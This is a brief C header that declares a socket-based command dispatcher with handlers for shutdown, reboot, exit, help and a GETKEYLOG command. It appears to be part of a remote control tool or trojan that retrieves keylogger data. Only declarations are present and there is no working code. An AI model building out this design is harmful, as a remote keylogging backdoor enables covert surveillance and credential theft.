#pragma once
#include "../common/socket.h"

typedef void (*pointPro)(void * param);

typedef struct {
	char * syntax;
	pointPro procedure;
} command;

typedef command box[10];

void inisialisasi(box cmd);

void proccess(char * syntax, void * param, box cmd);

void addCommand(char * syntax, void * procedure, box cmd);

void SHUTDOWN(void * paramT);

void REBOOT(void * paramT);

void EXIT(void * paramT);

void HALLO(void * paramT);

void GETKEYLOG(void * paramT);

void HELP(void * paramT);

DWORD WINAPI execMessage(LPVOID paramT);